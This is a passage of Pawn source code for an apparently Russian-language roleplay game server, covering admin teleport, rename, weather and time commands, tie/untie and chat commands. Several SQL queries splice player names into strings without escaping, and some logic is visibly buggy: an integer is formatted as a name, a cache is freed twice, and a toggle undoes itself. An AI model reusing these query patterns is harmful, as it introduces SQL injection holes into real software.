			if(IsValidDynamic3DTextLabel(g_vehicle[vehicleid][veh_number_label]))
				DestroyDynamic3DTextLabel(g_vehicle[vehicleid][veh_number_label]);

			if(IsValidDynamic3DTextLabel(g_vehicle[vehicleid][veh_label]))
				DestroyDynamic3DTextLabel(g_vehicle[vehicleid][veh_label]);

			PI[to_player][P_OWNABLE_CAR][slot-1] = INVALID_VEHICLE_ID;

			ClearVehicleData(vehicleid);

			DestroyVehicle(vehicleid);
		}

		format(fmt_query, sizeof fmt_query, "UPDATE ownable_cars SET model=%d, color_1=%d, color_2=%d WHERE owner_name='%s' AND slot=%d LIMIT 1", model_car, color1, color2, GetName(to_player), slot);
		mysql_query(dbHandle, fmt_query);

		format(fmt_query, sizeof fmt_query, "Руководитель %s установил Вам автомобиль %s в слоте %d", GetName(playerid), g_vehicle_info[model_car - 400][VI_NAME], slot);
		SendClientMessage(to_player, C_OSNOV, fmt_query);

		format(fmt_query, sizeof fmt_query, "Вы установили %s автомобиль %s в слот %d", GetName(to_player), GetCarName(model_car), slot);
		SendClientMessage(playerid, C_OSNOV, fmt_query);

		cache_delete(result);

		return 1;
	}
	else
	{
		new r = random(sizeof SalonRandSpawn);

		mysql_format(dbHandle, fmt_query, sizeof fmt_query, "INSERT INTO ownable_cars (owner_name, model, color_1, color_2, slot, pos_x, pos_y, pos_z, pos_r) VALUES ('%s', '%d', '%d', '%d', '%d', '%f', '%f', '%f', '%f')", GetName(to_player), model_car, color1, color2, slot, SalonRandSpawn[r][0], SalonRandSpawn[r][1], SalonRandSpawn[r][2], SalonRandSpawn[r][3]);
		mysql_query(dbHandle, fmt_query);

		format(fmt_query, sizeof fmt_query, "Руководитель %s установил Вам автомобиль %s в слоте %d", GetName(playerid), GetCarName(model_car), slot);
		SendClientMessage(to_player, C_OSNOV, fmt_query);

		format(fmt_query, sizeof fmt_query, "Вы установили %s автомобиль %s в слот %d", GetName(to_player), GetCarName(model_car), slot);
		SendClientMessage(playerid, C_OSNOV, fmt_query);

		cache_delete(result);
	}

	cache_delete(result);
	return 1;
}

CMD:setname(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 4) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	if(set_name == -1) return SendClientMessage(playerid, COLOR_GREY, "Никто не предлагал сменить ник!");
	else if(!strcmp(PlayerName[set_name], "None", true)) return SendClientMessage(playerid, COLOR_GREY, "Этот игрок не предлагал сменить ник!");
	if(GetPlayerHouse(set_name) > 0)
	{
		new i = GetPVarInt(set_name, "PlayerHouse");
		format(HouseInfo[i][hOwner], MAX_PLAYER_NAME, PlayerName[set_name]);
		MysqlUpdateHouseStr(i, "hOwner", PlayerName[set_name]);
	}
	if(GetPlayerBizz(set_name) > 0)
	{
		new i = GetPVarInt(set_name, "PlayerBizz");
		format(BizzInfo[i][bOwner], MAX_PLAYER_NAME, PlayerName[set_name]);
		MysqlUpdateBizzStr(i, "owner", PlayerName[set_name]);
		UpdateBizz(i);
	}
	new rows;
	new string[128];
	new Cache: result;

	format(string, sizeof string, "SELECT * FROM ownable_cars WHERE owner_name='%s'", GetName(playerid));
	result = mysql_query(dbHandle, string);
	rows = cache_num_rows();

	if(rows)
	{
		format(string, sizeof string, "UPDATE ownable_cars SET owner_name='%s' WHERE owner_name='%s'", set_name, GetName(playerid));
		mysql_query(dbHandle, string);
		cache_delete(result);
	}

	cache_delete(result);

	format(string, sizeof(string), "Заявку одобрил администратор %s", GetName(playerid));
	SendAdminMessage(COLOR_GREY, string);
	format(string, sizeof(string), "%s изменил нонРП имя на %s", GetName(set_name), PlayerName[set_name]);
	SendClientMessageToAll(COLOR_YELLOW, string);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL),"UPDATE "T_ACCOUNTS" SET name='%s' WHERE name='%s'", PlayerName[set_name], GetName(set_name));
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	if(PI[set_name][pAdmin])
	{
	    STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_ADMIN" SET name='%s' WHERE name='%s'", PlayerName[set_name], GetName(set_name));
		mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	}
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "INSERT INTO `historyname` (`idacca`, `Name`) VALUE ('%d', '%s')", PI[set_name][pID], PlayerName[set_name]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
	format(GetName(set_name), MAX_PLAYER_NAME, PlayerName[set_name]);
	SetPlayerName(set_name, PlayerName[set_name]);
	SendMes(set_name, COLOR_GREEN, "Ваше новое имя: {ffffff}%s", PlayerName[set_name]);
	SendClientMessage(set_name, COLOR_GREEN, "Обязательно нужно сделать скриншот. Клавиша: {ffffff}F8");
	SendClientMessage(set_name, COLOR_GREEN, "Пропишите свой новый ник в окне {ffffff}CR:MP");
	strmid(PlayerName[set_name], "None", 0, strlen("None"), MAX_PLAYER_NAME);
	Kick(set_name);
	set_name = -1;
	return 1;
}

CMD:setnick(playerid, params[])
{
	if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	else if(PI[playerid][pAdmin] < 4) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);

	if(isnull(params))
		return SendClientMessage(playerid, C_RED, "Используйте /setnick [id игрока] [новое имя]");

	new id;
	if(sscanf(params, "us[24]", id, params))
		return SendClientMessage(playerid, C_RED, "Используйте /setnick [id игрока] [новое имя]");
	else if(id == INVALID_PLAYER_ID)
		return SendMess(playerid, MSG_PLAYER_OFFLINE);


	STRING_GLOBAL[0] = '\0';
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Администратор %s изменил вам временное имя на %s. Пожалуйста, не производите операций с имуществом.", PI[playerid][pName], params);
	SendClientMessage(id, -1, STRING_GLOBAL);

	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[A] Администратор %s изменил временное имя игроку %s на %s.", PI[playerid][pName], PI[id][pName], params);
	SendClientMessage(playerid, -1, STRING_GLOBAL);

	SetPlayerName(id, params);
	return 1;
}
CMD:attach(playerid, params[])
{
	if(IsACop(playerid))
	{
		if(PI[playerid][pRank] < 5)
			return SendClientMessage(playerid, C_RED, "Вам недоступена эта возможность");

		new vehicleid = GetPlayerVehicleID(playerid);

		if(GetVehicleModel(vehicleid) == 525)
		{
			if(IsTrailerAttachedToVehicle(vehicleid))
			{
				DetachTrailerFromVehicle(vehicleid);
				SendClientMessage(playerid, C_RED, "Вы отцепили транспорт от эвакуатора");
				return 1;
			}

			new Float:posx, Float:posy, Float:posz;
			new Float:oldposx, Float:oldposy, Float:oldposz;
			new Float:tempposx, Float:tempposy, Float:tempposz;
			new Float:Radi=6.0;        //Расстояние от тачки
			new Float:AngRange=90.0;    //максимальный радиус

			new Float:plAngle;    GetVehicleZAngle(vehicleid, plAngle);
			new Float:crAngle,Float:Angle,Float:Angle2;

			foreach(new i: Vehicle)
			{
				if(i == vehicleid) continue;

				GetVehiclePos(vehicleid, posx, posy, posz);
				GetVehiclePos(i, oldposx, oldposy, oldposz);
				tempposx = (oldposx -posx);
				tempposy = (oldposy -posy);
				tempposz = (oldposz -posz);
				if (((tempposx < Radi) && (tempposx > -Radi)) && ((tempposy < Radi) && (tempposy > -Radi)) && ((tempposz < Radi) && (tempposz > -Radi)))
				{
					GetVehicleZAngle(i, crAngle);
					Angle = (plAngle -crAngle);
					Angle2= (Angle-180.0);
					if (( ((Angle < AngRange) && (Angle > -AngRange)) || ((Angle2 < AngRange) && (Angle2 > -AngRange)) ))
					{
						if(GetVehicleData(i, veh_owner_id) == INVALID_PLAYER_ID)
						{
							SendClientMessage(playerid, C_RED, "У этого транспорта нет владельца");
							break;
						}

						AttachTrailerToVehicle(i, vehicleid);
						SendClientMessage(playerid, C_OSNOV, "Вы прицепили транспорт к эвакуатору. Доставьте его на штрафстоянку");
						SetPlayerRaceCheckpoint(playerid, 1, 1783.2152,-235.6791,4.0671, 0.0, 0.0, 0.0, 3.0);
						break;
					}
				}
			}
		}

	}
	return 1;
}

CMD:tie(playerid, params[])
{
	if(!IsAMafia(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	if(pCuff[playerid][pCuffee] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы в наручниках, Вы не можете связывать!");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /tie [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	new Float:possed[4];
	GetPlayerPos(params[0],possed[0],possed[1],possed[2]);
	if(!IsPlayerInRangeOfPoint(playerid, 1, possed[0],possed[1],possed[2])) return SendClientMessage(playerid, COLOR_WHITE, "Вы слишком далеко от данного игрока");
	if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете связать себя!");
	if(PlayerTied[params[0]]) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже связан!");
	new string[100];
	SendMes(playerid, 0x6495EDFF, "Вы связали %s", GetName(params[0]));
	if(PI[playerid][pSex] == 1)
	{
		SendMes(params[0], 0x6495EDFF, "%s связал Вас", GetName(playerid));
		format(string, sizeof(string), "связал %s", GetName(params[0]));
	}
	else
	{
	    SendMes(params[0], 0x6495EDFF, "%s связала Вас", GetName(playerid));
		format(string, sizeof(string), "связала %s", GetName(params[0]));
	}
	MeAction(playerid, string);
	GameTextForPlayer(playerid, "~r~tieted", 5000, 5);
	GameTextForPlayer(params[0], "~r~tieted", 5000, 5);
	TogglePlayerControllable(params[0], 0);
	PlayerTied[params[0]] = true;
	return 1;
}

CMD:untie(playerid, params[])
{
	if(!IsAMafia(playerid)) return SendMess(playerid, MSG_YOU_CAN_NOT);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /untie [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	new Float:possed[4];
	GetPlayerPos(params[0],possed[0],possed[1],possed[2]);
	if(!IsPlayerInRangeOfPoint(playerid, 4, possed[0],possed[1],possed[2])) return SendClientMessage(playerid, COLOR_WHITE, "Вы слишком далеко от данного игрока");
	if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете развязать себя!");
	if(!PlayerTied[params[0]]) return SendClientMessage(playerid, COLOR_GREY, "Игрок не связан!");
	new string[100];
	SendMes(playerid, 0x6495EDFF, "Вы развязали %s", GetName(params[0]));
	if(PI[playerid][pSex] == 1)
	{
		SendMes(params[0], 0x6495EDFF, "%s развязал Вас", GetName(playerid));
		format(string, sizeof(string), "развязал %s", GetName(params[0]));
	}
	else
	{
	    SendMes(params[0], 0x6495EDFF, "%s развязала Вас", GetName(playerid));
		format(string, sizeof(string), "развязала %s", GetName(params[0]));
	}
	MeAction(playerid, string);
	GameTextForPlayer(playerid, "~g~untied", 5000,5);
	GameTextForPlayer(params[0], "~g~untied", 5000,5);
	TogglePlayerControllable(params[0], 1);
	PlayerTied[params[0]] = false;
	return 1;
}

CMD:spawn(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /spawn [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	new string[128];
	format(string, sizeof(string), "[A] %s[%d] заспавнил игрока %s[%d]", GetName(playerid), playerid, GetName(params[0]), params[0]);
	SendAdminMessage(COLOR_GREY, string);
	SpawnPlayer(params[0]);
	return 1;
}

CMD:jet(playerid,  params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2)
		return 1;
	if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите:/jet [id игрока]");
    SetPlayerSpecialAction(params[0],SPECIAL_ACTION_USEJETPACK);
    return 1;
}

CMD:g(playerid, params[]) return callcmd::goto(playerid, params);
CMD:goto(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /goto [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[playerid][pAdmin] < 7 && AdminInfo[params[0]][admGoto]) return SendClientMessage(playerid, COLOR_GREY, "Телепорт к этому администратору запрещён");
	//else if(GetString(GetName(playerid), NGA1)) return SendClientMessage(playerid, COLOR_GREY, "Телепорт к этому администратору запрещён");
	new Float:plocx,Float:plocy,Float:plocz;
 	GetPlayerPos(params[0], plocx, plocy, plocz);
	if(GetPlayerState(playerid) == 2) SetVehiclePos(GetPlayerVehicleID(playerid), plocx+2, plocy+2, plocz);
	else SetPlayerPos(playerid, plocx+2, plocy+2, plocz);
	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(params[0]));
	SetPlayerInterior(playerid, GetPlayerInterior(params[0]));
	new string[128];
	format(string, sizeof(string), "[A] %s[%d] телепортировался к игроку %s[%d]", GetName(playerid), playerid, GetName(params[0]), params[0]);
	SendAdminMessage(COLOR_GREY, string);
	return 1;
}

CMD:up(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    new Float:plocx,Float:plocy,Float:plocz;
    if(PI[playerid][pAdmin] < 2) return 1;
    GetPlayerPos(playerid, plocx, plocy, plocz);
    SetPlayerPos(playerid, plocx, plocy, plocz+2);
	return 1;
}

CMD:down(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    new Float:plocx,Float:plocy,Float:plocz;
    if(PI[playerid][pAdmin] < 2) return 1;
    GetPlayerPos(playerid, plocx, plocy, plocz);
    SetPlayerPos(playerid, plocx, plocy, plocz-2);
	return 1;
}

CMD:left(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    new Float:plocx,Float:plocy,Float:plocz;
    if(PI[playerid][pAdmin] < 2) return 1;
    GetPlayerPos(playerid, plocx, plocy, plocz);
    SetPlayerPos(playerid, plocx, plocy-2, plocz);
	return 1;
}

CMD:right(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    new Float:plocx,Float:plocy,Float:plocz;
    if(PI[playerid][pAdmin] < 2) return 1;
    GetPlayerPos(playerid, plocx, plocy, plocz);
    SetPlayerPos(playerid, plocx, plocy+2, plocz);
	return 1;
}

CMD:gcar(playerid, params[]) return callcmd::gotocar(playerid, params);
CMD:gotocar(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /gotocar [id транспорта]");
	new Float:x, Float:y, Float:z;
	GetVehiclePos(params[0], x, y, z);
	SetPlayerPos(playerid, x+2, y+2, z);
	return 1;
}

CMD:getcar(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /getcar [id транспорта]");
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	SetVehiclePos(params[0], x+2, y+2, z);
	return 1;
}

CMD:gethere(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /gethere [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[playerid][pAdmin] < ADM_GRAND_ADMIN && AdminInfo[params[0]][admGethere]) return SendClientMessage(playerid, COLOR_GREY, "Телепорт этого администратора запрещён");
    //else if(GetString(GetName(playerid), NGA1)) return SendClientMessage(playerid, COLOR_GREY, "Телепорт этого администратора запрещён");
	new Float:plocx, Float:plocy, Float:plocz;
	GetPlayerPos(playerid, plocx, plocy, plocz);
	if(GetPlayerState(params[0]) == 2) SetVehiclePos(GetPlayerVehicleID(params[0]), plocx, plocy, plocz);
	else SetPlayerPos(params[0], plocx, plocy, plocz);
	SetPlayerVirtualWorld(params[0], GetPlayerVirtualWorld(playerid));
	SetPlayerInterior(params[0], GetPlayerInterior(playerid));
	if(InHospital[params[0]]) InHospital[params[0]] = false;
	new string[128];
	format(string, sizeof(string), "Администратор %s[%d] телепортировал Вас к себе", GetName(playerid), playerid);
	SendClientMessage(params[0], COLOR_WHITE, string);
	format(string, sizeof(string), "[A] %s[%d] телепортировал игрока %s[%d] к себе", GetName(playerid), playerid, GetName(params[0]), params[0]);
	SendAdminMessage(COLOR_GREY, string);
	return 1;
}

CMD:settime(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 4)
		return 1;

	if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /settime [время]");
	else if(params[0] < 0 || params[0] > 23) return SendClientMessage(playerid, COLOR_GREY, "Время от 0 до 23!");
	SetWorldTime(params[0]);
	new string[128];
	format(string, sizeof(string), "[A] %s[%d] изменил время на %i часа", GetName(playerid), playerid, params[0]);
	SendAdminMessage(COLOR_GREY, string);
	return 1;
}

CMD:setweather(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 4) return 1;
	else if(TextResetCMD[playerid] > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Не флуди");
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	ShowPlayerDialog(playerid, D_WEATHER, 2, "Погода", "\
		1. Разные версии синих небес/облаков\n\
		2. Разные версии синих небес/облаков\n\
		3. Разные версии синих небес/облаков\n\
		4. Разные версии синих небес/облаков\n\
		5. Разные версии синих небес/облаков\n\
		6. Разные версии синих небес/облаков\n\
		7. Разные версии синих небес/облаков\n\
		8. Гроза\n\
		9. Пасмурно и туман\n\
		10. Ясное синее небо\
	", "Принять", "Отмена");
	return 1;
}

CMD:msg(playerid,params[])
{
	if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 4) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /a [текст]");
	new adm_name[32];
 	if(PI[playerid][pAdmin] == 4){format(adm_name,32,"Мл. Администратор");}
	else if(PI[playerid][pAdmin] == 5){format(adm_name,32,"Администратор");}
	else if(PI[playerid][pAdmin] == 6){format(adm_name,32,"Ст. Администратор");}
	else if(PI[playerid][pAdmin] == 7){format(adm_name,32,"Гл. Администратор");}

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, 256, "%s %s[%d]: %s", adm_name, GetName(playerid), playerid, params[0], params[0]);
	SCMTA(COLOR_MANDARIN, STRING_GLOBAL);
	return true;
}

CMD:createradar(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 7)
		return 1;

	ShowPlayerDialog(playerid, D_RADAR, DIALOG_STYLE_LIST, "Создание радара","\
		{FFFFFF}1. Дворовая территория {49C830}(Макс. доп. скорость: 20км/ч)\n\
		{FFFFFF}2. Населенные пункты {49C830}(Макс. доп. скорость: 60км/ч)\n\
		{FFFFFF}3. Автомагистрали {49C830}(Макс. доп. скорость: 110км/ч)\n\
		{FFFFFF}4. Вне населенных пунктов(ост. дороги): {49C830}(Макс. доп. скорость: 90км/ч)",
		"Выбрать","Отмена");
	return 1;
}

CMD:a(playerid,params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 2) return SendClientMessage(playerid, COLOR_WHITE, "Команда не обнаружена! Используйте {FFCC00}/menu {FFFFFF}для просмотра команд");
	else if(isnull(params)) return SendClientMessage(playerid, COLOR_LIME, "Информация: {ffffff}/a [текст]");
	else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid, COLOR_RED, "Не флудите");
	new string[128];
	format(string, sizeof(string), "[A] %s [%d]: %s", GetName(playerid), playerid, params[0]);
	SendAdminMessage(COLOR_LIME, string);
	SetString(OldMessage[playerid], params[0]);
	TextReset[playerid] = gettime()+3;
	return 1;
}

CMD:as(playerid,params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_WHITE, "Команда не обнаружена! Используйте {FFCC00}/menu {FFFFFF}для просмотра команд");
	else if(isnull(params)) return SendClientMessage(playerid, COLOR_LIME, "Информация: {ffffff}/as [текст]");
	else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid, COLOR_RED, "Не флудите");
	new string[128];
	format(string, sizeof(string), "[Support] %s [%d]: %s", GetName(playerid), playerid, params[0]);
	SendSupportMessage(COLOR_LIME, string);
	SetString(OldMessage[playerid], params[0]);
	TextReset[playerid] = gettime()+3;
	return 1;
}
CMD:asall(playerid)
{
	if(PI[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_WHITE, "Команда не обнаружена! Используйте {FFCC00}/menu {FFFFFF}для просмотра команд");
	if(GetPVarInt(playerid, "AdminAS") > gettime()) return SendClientMessage(playerid, COLOR_WHITE, "Вызывать администратора можно раз в 2 минуты!");
	new string[124];
	format(string, sizeof(string), "Помощник по игре %s вызывает адмнистратора. Для подключения к чату используйте /asconnect", GetName(playerid));
	SendAdminMessage(COLOR_LIME, string);
    SetPVarInt(playerid, "AdminAS", gettime()+120);
	return 1;
}

CMD:asconnect(playerid,params[])
{
    if(PI[playerid][pAdmin] < 2) return SendClientMessage(playerid, COLOR_WHITE, "Команда не обнаружена! Используйте {FFCC00}/menu {FFFFFF}для просмотра команд");
	if(GetPVarInt(playerid, "SupportChat") == 0)
	{
		SetPVarInt(playerid, "SupportChat", 1);
		SendClientMessage(playerid, COLOR_LIME, "Вы подключись к support чату");
	}
	if(GetPVarInt(playerid, "SupportChat") == 1)
	{
		DeletePVar(playerid, "SupportChat");
		SendClientMessage(playerid, COLOR_RED, "Вы отключились от support чата");
	}
	return 1;
}

/*CMD:js(playerid,params[])
{

	if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
	else if(PI[playerid][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "В тюрьме недоступно!");
	else if(PI[playerid][pVip] == 0 && PI[playerid][pAdmin] == 0) return SendClientMessage(playerid, COLOR_GREY, "К сожалению, Вы не имеете доступа к данному чату");
	else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /js [текст]");
	else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid, COLOR_GREY, "Не флуди");
	else if(IsIpFound(params[0]) || CheckString(params[0]) && !IsPlayerDeveloperAdmin(playerid)) return PlayerGetsChatBan(playerid, params[0]);
	new string[128];
	format(string, sizeof(string), "JS {FFFFFF}| %s[%d]: %s", GetName(playerid), playerid, params[0]);
	SendSocMessage(COLOR_ORANGE, string);
	SetString(OldMessage[playerid], params[0]);
	TextReset[playerid] = gettime()+3;
	return 1;
}*/

CMD:b(playerid, params[]) return callcmd::n(playerid, params);
CMD:n(playerid, params[])
{
	if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
	else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /n [текст]");
	else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
	else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
	new string[128];
	format(string, sizeof(string), "(( %s[%i]: %s ))", GetName(playerid), playerid, params);
	ProxDetector(20.0, playerid, string, 0xCCCC99FF, 0xCCCC99FF, 0xCCCC99FF, 0xCCCC99FF, 0xCCCC99FF);
	SetPlayerChatBubble(playerid, params, 0xCCCC99FF, 20.0, 7000);
	SetString(OldMessage[playerid], params[0]);
	TextReset[playerid] = gettime()+3;
	return 1;
}

CMD:s(playerid, params[])
{
    if(PI[playerid][pTime] < 1) return SendClientMessage(playerid, COLOR_GREY, "Вы должны играть на сервере более 1 часа!");
	else if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
	else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /s [текст]");
	else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
	else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
	new string[128];
	format(string, sizeof(string), "%s кричит: %s", GetName(playerid), params[0]);
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) ApplyAnimation(playerid,"RIOT","RIOT_shout",4.1,0,0,0,0,1);
	foreach(new i: Player)
	{
		if(!IsPlayerConnected(i)) continue;
		new Float:rdist, c;
		rdist = GetPlayerDistanceToPlayer(playerid, i);
		if(!PlayerLogged[i] || rdist > 13.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(i)) continue;
		switch(floatround(rdist))
		{
			case 0..3: c = 0xFFFFFFFF;
			case 4..8: c = 0xCCCCCCFF;
			case 9..13: c = 0xAAAAAAFF;
			default: c = 0x888888FF;
		}
		SendClientMessage(i, c, string);
	}
	SetString(OldMessage[playerid], params[0]);
	TextReset[playerid] = gettime()+3;
	return 1;
}

CMD:w(playerid, params[])
{
	if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
	else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /w [текст]");
	else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
	else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
	new string[128];
	format(string, sizeof(string), "%s шепчет: %s", GetName(playerid), params[0]);
	ProxDetector(1.2,playerid, string, 0xBDB76BFF, 0xBDB76BFF, 0xBDB76BFF, 0xBDB76BFF, 0xBDB76BFF);
	SetPlayerChatBubble(playerid,params[0],COLOR_WHITE,1.2,10000);
	SetString(OldMessage[playerid], params[0]);
	TextReset[playerid] = gettime()+3;
	return 1;
}

CMD:gnews(playerid, params[])
{
	if(!IsTheMember(PI[playerid][pMember])) return SendMess(playerid, MSG_YOU_CAN_NOT);
